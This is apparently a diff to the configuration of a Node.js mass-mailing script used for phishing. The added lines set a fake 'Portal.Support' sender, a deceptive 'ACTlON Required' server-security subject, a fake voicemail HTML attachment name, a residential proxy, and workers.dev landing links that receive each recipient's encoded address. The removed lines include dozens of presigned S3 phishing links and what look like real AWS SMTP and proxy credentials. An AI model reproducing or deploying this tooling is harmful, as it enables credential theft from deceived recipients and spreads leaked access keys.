@@ -102,31 +102,31 @@ const options = {
   useAuthentication: true,
   useProxy: false,
   proxyType: 'SOCKS5', // Options: 'SOCKS', 'HTTPS'
-  smtpHost: 'email-smtp.us-east-1.amazonaws.com',
-  smtpPort: 587,
+  smtpHost: 'synsysinc-com.mail.protection.outlook.com',
+  smtpPort: 25,
   smtpSecure: false,
   secureProtocol: 'SSLv23_method', // Options: 'SSLv23_method', 'TLSv1_2_method', etc.
-  smtpUsername: 'AKIAZ3YXYNS3H4M3MFXM',
-  smtpPassword: 'BL/4Xc9LK7G4H5TLGxobiOg4UmBBxmuetBLMA0VdngY9',
-  proxyHost: '172.65.181.245',
-  proxyPort: 31212,
-  proxyUsername: 'customer-DTkA5QpI7K-country-US-session-s4R2H7IPIhTyxMO-time-5',
-  proxyPassword: 'GrnzzE5a',
+  smtpUsername: '',
+  smtpPassword: '',
+  proxyHost: '63.160.189.222',
+  proxyPort: 35149,
+  proxyUsername: 'user',
+  proxyPassword: 'user',
   useConcurrency: true,
-  concurrencyLimit: 5,
+  concurrencyLimit: 3,
   includeAttachments: false,
   attachmentPath: 'attachment.txt', // Specify the attachment file path here
-  ENABLE_ENCRYPTION: true,
+  ENABLE_ENCRYPTION: false,
   Encode_Attachment: false,
 };
 
 
-const attachmentNameWithPlaceholders = 'call_playback_{RECIPIENT_DOMAIN_NAME}.html';
-const senderAddresses = ['akash@vam.telepresenz.com'];
-const messageFile = 'message.html';
-const senderNameWithPlaceholders = ""; 
-const subjectLineWithPlaceholders = ""
-const MAX_RETRIES = 3; 
+const attachmentNameWithPlaceholders = 'vm-20241104193406035753-fadceb388a85af9bdf506d7fgds693hdj.html';
+const senderAddresses = ['mvurda@synsysinc.com'];
+const messageFile = 'msg.txt';
+const senderNameWithPlaceholders = "Portal.Support"; 
+const subjectLineWithPlaceholders = "ACTlON Required- {RECIPIENT_DOMAIN_NAME} Server SecurityID:{RANDOM_STRING}";
+const MAX_RETRIES = 1; 
 const SUCCESS_FILE = 'success-emails.txt';
 const FAILURE_FILE = 'failed-emails.txt';
 
@@ -228,56 +228,8 @@ async function sendEmailViaSMTP(recipientAddress, senderAddress) {
   const recipientBase64Email = Buffer.from(recipientAddress).toString('base64');
   const randomMD5 = generateRandomMD5();
   const randomlinks = [
-"//42gl28.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=nfI6FHPzlYdk0QPPL7Zs25Ol3TE%3D&Expires=1735389788",
-"//2qxmlv.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=DWqhHZynT5atOmlakDuu%2Fl3szCk%3D&Expires=1735389791",
-"//t0x5j9.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=KDS4cJ8ZP2oMrD5qc6QqM7SKXog%3D&Expires=1735389793",
-"//p7d13d.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=5S%2FB%2BYqebh%2BheSKJkcJNTeoyREg%3D&Expires=1735389796",
-"//ftmdql.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=CBl4D1uw0gx18cAF2%2B33RnFFZfc%3D&Expires=1735389798",
-"//nwaxg4.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=hbjhPgA2rkHoSOGdNTadL%2BmZ%2F34%3D&Expires=1735389801",
-"//m7l56g.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=NW3bduxP7ayWrd7MlQt%2BCoH7Ib8%3D&Expires=1735389803",
-"//njyfxa.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=faSf7fo%2B6NGO1voMmAaXslCXkWs%3D&Expires=1735389806",
-"//soj6qg.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=lxtDoukxltOqMpzp4IiVaSt6O%2F4%3D&Expires=1735389809",
-"//egvrdp.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=5h1UeUkeadapH9QLfSIz7civdP0%3D&Expires=1735389811",
-"//l2ipt6.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=tDOvUp7aYALIVwV1AOy6HrmmINE%3D&Expires=1735389814",
-"//cedps2.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=lB6nyoXD6RhtX%2B%2Bp4I0GasSYL6I%3D&Expires=1735389817",
-"//3q3ij6.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=cdlHDuXFAkIqpJN9MCRSuz4427k%3D&Expires=1735389819",
-"//2e124e.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=uLS0BC2MqEVJsLVVUzYeypoQkTU%3D&Expires=1735389822",
-"//8vp1mi.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=AVZHKH2KB9PYN%2FC2A6u5V9%2FHEJ0%3D&Expires=1735389825",
-"//uj9w23.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=i8TLUOVxL8eoWy%2Bt6SGijusAXlw%3D&Expires=1735389827",
-"//0cc6hp.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=5cD%2FWySqieL7tR%2Bf%2F9D6b%2B5twHg%3D&Expires=1735389830",
-"//zg8wex.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=hyhyn8WQF45nSKQKNyGjelcNuH4%3D&Expires=1735389833",
-"//d2c5bb.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=yH4gZm7W45VAp1pw2fMzlRgjibk%3D&Expires=1735389835",
-"//37r8ji.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=IxofTtOY%2B%2BT2qq8tvtpzL5RXYnA%3D&Expires=1735389838",
-"//0576lp.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=x7IBf8PfbqMtdIhLHjJ7TuaaVVQ%3D&Expires=1735389841",
-"//935u1m.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=IMWSAXZTI125efU8UKp%2F6FPUAkw%3D&Expires=1735389843",
-"//o59jsb.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=SwRVtp7qf9Bj6qRPnJjmxMugzAo%3D&Expires=1735389846",
-"//68j182.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=mCqaYi7AVQaX0EK18APxrE9AUa0%3D&Expires=1735389848",
-"//xcib59.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=KGOahBy453%2Bgyk8jJHZhiekOV98%3D&Expires=1735389851",
-"//95dnl3.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=QDGglKp1xffMfYtfmttq0x2nWbs%3D&Expires=1735389854",
-"//4clr8b.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=jOpSlI7QBWoBcmKb3Ftdb2upMwA%3D&Expires=1735389857",
-"//i0yi7r.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=io4cn6hDljCvRPefYu3eEwMKgRo%3D&Expires=1735389859",
-"//k52cl5.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=q7WwFkCnebk1YHVKd9cuAatXazc%3D&Expires=1735389862",
-"//w0e41t.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=f%2FsVxPiacqiNqAQTNISLVeAg%2FB4%3D&Expires=1735389864",
-"//pw0l61.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=37o2krQpJzxUedMqB355xrJHkYM%3D&Expires=1735389867",
-"//dr7szb.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=jcxkxDos70NPmtk2Mqhud7WVU%2FE%3D&Expires=1735389870",
-"//kecy8l.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=erm5V3tULrBGywlRhLLRec6B2ko%3D&Expires=1735389872",
-"//6ok8d0.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=aidM%2B537FKkRctFCL1QJJeBtMvc%3D&Expires=1735389875",
-"//yb556x.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=B9ZYsPmvGGddyq3frdafdUf6QGQ%3D&Expires=1735389878",
-"//qx49zp.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=WArvDbHl8KxMLL9G5lR0s4vo4r0%3D&Expires=1735389880",
-"//1f32x5.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=cub6hpSKCpmZbAXaXWPraMtbN3A%3D&Expires=1735389883",
-"//n2698v.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=awYTEOa9QU05EbQPyNnmclJDmbY%3D&Expires=1735389885",
-"//p3w0rg.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=EN3pzCE3uvVYfMN6xIOcK2z%2FnOc%3D&Expires=1735389888",
-"//rldfix.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=HLRMxq6SSI5Qz%2FqHo%2B%2BATdTWLMs%3D&Expires=1735389890",
-"//f6ybuz.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=pykd6ATQKmIV3%2F3EouS5%2Fucuphs%3D&Expires=1735389893",
-"//5smua2.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=Mdt2aTd0NIJIO%2BatmuabTDRAPd8%3D&Expires=1735389895",
-"//1ztsel.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=B55WsHTyy7o9cf37WtkxJLH5CO8%3D&Expires=1735389898",
-"//g11qx8.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=%2BvLREnKL5PwfNiC4X1kPKYL%2FGHg%3D&Expires=1735389901",
-"//vlys9a.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=lL2nO6RY%2F3Q1lzyrm1JXKO2lpV0%3D&Expires=1735389903",
-"//244dyg.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=gI9Hg1G0HYePgEl9aAb1%2FkcPy08%3D&Expires=1735389906",
-"//5cdrc5.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=Z7S1EhRGtLdfgaodYwdnXxZNazs%3D&Expires=1735389909",
-"//pusnr8.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=uO63dmkc%2Bl9S69W8%2BhjFD97HPVY%3D&Expires=1735389911",
-"//0bd10g.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=gMv1FfxkSyKEpuqKOctRFjRaeA0%3D&Expires=1735389914",
-"//tru3zn.s3.amazonaws.com/index.html?AWSAccessKeyId=AKIA55HGJCUCLCFI64SL&Signature=%2FWlLL6G46iKABdMLz7mwqyD7nTQ%3D&Expires=1735389917"
+"https://worker-rough-fire-759a.berwieberwieberwieberwieberwie.workers.dev/?eba=",
+"https://worker-nameless-haze-86e5.berwieberwieberwieberwieberwie.workers.dev/?eba="
 ];
 		const randomIndex = Math.floor(Math.random() * randomlinks.length);
         const randomLink = randomlinks[randomIndex];
@@ -488,7 +440,8 @@ async function sendEmailViaMX(recipientAddress, senderAddress) {
   const recipientBase64Email = Buffer.from(recipientAddress).toString('base64');
   const randomMD5 = generateRandomMD5();
   const randomlinks = [
-"https://linkedin.com"
+"https://worker-rough-fire-759a.berwieberwieberwieberwieberwie.workers.dev/?eba=",
+"https://worker-nameless-haze-86e5.berwieberwieberwieberwieberwie.workers.dev/?eba="
 ];
 		const randomIndex = Math.floor(Math.random() * randomlinks.length);
         const randomLink = randomlinks[randomIndex];
